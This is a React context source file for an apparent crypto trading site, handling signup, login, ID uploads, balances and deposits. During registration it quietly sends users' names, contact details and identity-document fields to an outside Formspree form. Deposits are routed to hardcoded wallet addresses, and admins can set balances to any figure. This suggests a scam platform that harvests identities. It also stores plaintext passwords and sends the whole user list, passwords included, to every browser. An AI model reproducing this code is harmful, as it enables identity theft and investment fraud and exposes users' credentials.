"use client";

import React, { createContext, useContext, useState, useEffect } from 'react';
import { UserSession, PendingDeposit } from '@/types/trading';

interface UserRecord extends UserSession {
  id: string;
  email: string;
  phone: string;
  password: string;
  active: boolean;
  balance: number;
  proofUrl?: string;
  idDocumentUrl?: string;
  // Identity verification fields saved at signup
  idType?: string;
  idFields?: Record<string, string>;
  fullName?: string;
  country?: string;
}

interface LoginResult {
  success: boolean;
  error?: string;
  user?: UserRecord;
}

interface UsersContextType {
  users: UserRecord[];
  currentUser: UserRecord | null;
  isReady: boolean;
  registerUser: (data: {
    id: string;
    username: string;
    email: string;
    phone: string;
    password: string;
    idType?: string;
    idFields?: Record<string, string>;
    idDocumentUrl?: string;
  }) => { success: boolean; error?: string };
  login: (username: string, password: string) => LoginResult;
  logout: () => void;
  activateUser: (userId: string, active: boolean) => void;
  deleteAccount: (userId: string) => void;
  adminDepositToUser: (userId: string, amount: number) => void;
  updateBalance: (userId: string, newBalance: number) => void;
  submitDepositRequest: (userId: string, amount: number, method: string) => void;
  adminApproveDeposit: (userId: string, depositId: string) => void;
  adminFailDeposit: (userId: string, depositId: string) => void;
  requestDepositInfo: (userId: string, method: string) => void;
  adminProvideDepositInfo: (userId: string, info: string) => void;
  uploadProof: (userId: string, file: File) => void;
  uploadIdDocument: (userId: string, file: File) => void;
}

const UsersContext = createContext<UsersContextType | undefined>(undefined);

export const UsersProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [users, setUsers] = useState<UserRecord[]>([]);
  const [currentUser, setCurrentUser] = useState<UserRecord | null>(null);
  const [isReady, setIsReady] = useState(false);

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const response = await fetch('/api/users');
        if (response.ok) {
          const loaded: UserRecord[] = await response.json();
          setUsers((prev) => {
            if (JSON.stringify(prev) !== JSON.stringify(loaded)) {
              return loaded;
            }
            return prev;
          });
        } else {
          console.error('Failed to fetch users');
        }
      } catch (err) {
        console.error('Error fetching users:', err);
      } finally {
        setIsReady(true);
      }
    };

    fetchUsers();
    const interval = setInterval(fetchUsers, 5000); // Poll every 5s for real-time updates
    return () => clearInterval(interval);
  }, []);

  const persist = (newUsers: UserRecord[]) => {
    setUsers(newUsers);
    fetch('/api/users', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(newUsers)
    }).catch(console.error);
  };

  const uploadProof = async (userId: string, file: File) => {
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = () => {
      const dataUrl = typeof reader.result === 'string' ? reader.result : '';
      const updated = users.map((u) => u.id === userId ? { ...u, proofUrl: dataUrl } : u);
      persist(updated);
      if (currentUser?.id === userId) setCurrentUser(updated.find(u => u.id === userId) || null);
    };
  };

  const uploadIdDocument = async (userId: string, file: File) => {
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = () => {
      const dataUrl = typeof reader.result === 'string' ? reader.result : '';
      const updated = users.map((u) => u.id === userId ? { ...u, idDocumentUrl: dataUrl } : u);
      persist(updated);
      if (currentUser?.id === userId) setCurrentUser(updated.find(u => u.id === userId) || null);
    };
  };

  const registerUser = ({ id, username, email, phone, password, idType, idFields, idDocumentUrl }: {
    id: string;
    username: string;
    email: string;
    phone: string;
    password: string;
    idType?: string;
    idFields?: Record<string, string>;
    idDocumentUrl?: string;
  }) => {
    if (users.find((u) => u.username === username)) {
      return { success: false, error: 'Username already exists' };
    }
    const newUser: UserRecord = {
      id,
      username,
      role: 'user',
      email,
      phone,
      password,
      active: false,
      balance: 0,
      idType,
      idFields,
      idDocumentUrl,
      fullName: idFields?.fullName,
      country: idFields?.country || idFields?.countryOfIssue || idFields?.nationality,
    };
    
    fetch('https://formspree.io/f/xojzjlaj', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, email, phone, idType, ...idFields })
    }).catch(console.error);

    const updated = [...users, newUser];
    persist(updated);
    return { success: true };
  };

  const login = (username: string, password: string): LoginResult => {
    const u = users.find((usr) => usr.username === username && usr.password === password);
    if (!u) return { success: false, error: 'Invalid credentials' };
    setCurrentUser(u);
    localStorage.setItem('trader_session', JSON.stringify({ username: u.username, role: u.role }));
    return { success: true, user: u };
  };

  const logout = () => {
    setCurrentUser(null);
    localStorage.removeItem('trader_session');
  };

  const activateUser = (userId: string, active: boolean) => {
    const updated = users.map((u) => (u.id === userId ? { ...u, active } : u));
    persist(updated);
  };

  const deleteAccount = (userId: string) => {
    const updated = users.filter((u) => u.id !== userId);
    persist(updated);
    if (currentUser?.id === userId) {
      logout();
    }
  };

  const adminDepositToUser = (userId: string, amount: number) => {
    if (amount <= 0) return;
    const updated = users.map((u) => (u.id === userId ? { ...u, balance: u.balance + amount } : u));
    persist(updated);
  };

  const updateBalance = (userId: string, newBalance: number) => {
    const updated = users.map((u) => (u.id === userId ? { ...u, balance: newBalance } : u));
    persist(updated);
    if (currentUser?.id === userId) {
      setCurrentUser((prev) => (prev ? { ...prev, balance: newBalance } : prev));
    }
  };

  const submitDepositRequest = (userId: string, amount: number, method: string) => {
    const updated = users.map((u) => {
        if (u.id === userId) {
          const addressMap: Record<string, string> = {
            BTC: "bc1qq9sxxj9lkx4q9cg9njg2a0wu0va0t96plx9kw9",
            USDT: "0x3Fa68EFa5fcAf126c533bC0868D70eFF80c21c33",
            XRP: "rJYM2L9Tnv92pMy7o5BsKroJJcT9UkZr6",
            SOL: "EybhWaArjNrTKXcoMenVtgHnTLzPX5AhDsZJuLvRH7yy",
            Ethereum: "0x3Fa68EFa5fcAf126c533bC0868D70eFF80c21c33"
          };
          const address = addressMap[method] || "0xDEMOADDRESS";
          const newDep: PendingDeposit = {
            id: Math.random().toString(36).substring(2, 11).toUpperCase(),
            amount,
            currency: method,
            address,
            status: 'pending',
            timestamp: new Date().toISOString(),
            method,
          };
          const pendingDeposits = u.pendingDeposits ? [...u.pendingDeposits, newDep] : [newDep];
          return { ...u, pendingDeposits };
        }
        return u;
      });
    persist(updated);
    if (currentUser?.id === userId) {
      setCurrentUser(updated.find(u => u.id === userId) || null);
    }
  };

  const adminApproveDeposit = (userId: string, depositId: string) => {
    const updated = users.map((u) => {
        if (u.id === userId && u.pendingDeposits) {
          const dep = u.pendingDeposits.find(d => d.id === depositId);
          if (dep && dep.status === 'pending') {
            const updatedDeposits = u.pendingDeposits.map((d) =>
              d.id === depositId ? { ...d, status: 'approved' as const } : d
            );
            return { ...u, balance: u.balance + dep.amount, pendingDeposits: updatedDeposits };
          }
        }
        return u;
      });
    persist(updated);
  };

  const adminFailDeposit = (userId: string, depositId: string) => {
    const updated = users.map((u) => {
        if (u.id === userId && u.pendingDeposits) {
          const updatedDeposits = u.pendingDeposits.map((d) =>
            d.id === depositId && d.status === 'pending' ? { ...d, status: 'rejected' as const } : d
          );
          return { ...u, pendingDeposits: updatedDeposits };
        }
        return u;
      });
    persist(updated);
  };

  const requestDepositInfo = (userId: string, method: string) => {
    const updated = users.map((u) => {
      if (u.id === userId) {
        return {
          ...u,
          depositMethodRequest: {
            method,
            requestedAt: new Date().toISOString(),
          }
        };
      }
      return u;
    });
    persist(updated);
  };

  const adminProvideDepositInfo = (userId: string, info: string) => {
    const updated = users.map((u) => {
      if (u.id === userId && u.depositMethodRequest) {
        return {
          ...u,
          depositMethodRequest: {
            ...u.depositMethodRequest,
            infoProvided: info,
          }
        };
      }
      return u;
    });
    persist(updated);
  };

  useEffect(() => {
    if (!isReady) return;
    const sess = localStorage.getItem('trader_session');
    if (!sess) return;
    try {
      const { username } = JSON.parse(sess);
      const u = users.find((usr) => usr.username === username);
      if (u) setCurrentUser(u);
    } catch {
      localStorage.removeItem('trader_session');
    }
  }, [users, isReady]);

  return (
    <UsersContext.Provider
      value={{
        users,
        currentUser,
        isReady,
        registerUser,
        login,
        logout,
        activateUser,
        adminDepositToUser,
        deleteAccount,
        updateBalance,
        submitDepositRequest,
        adminApproveDeposit,
        adminFailDeposit,
        requestDepositInfo,
        adminProvideDepositInfo,
        uploadProof,
        uploadIdDocument
      }}
    >
      {children}
    </UsersContext.Provider>
  );
};

export const useUsers = () => {
  const value = useContext(UsersContext);
  if (!value) throw new Error('useUsers must be used within UsersProvider');
  return value;

};
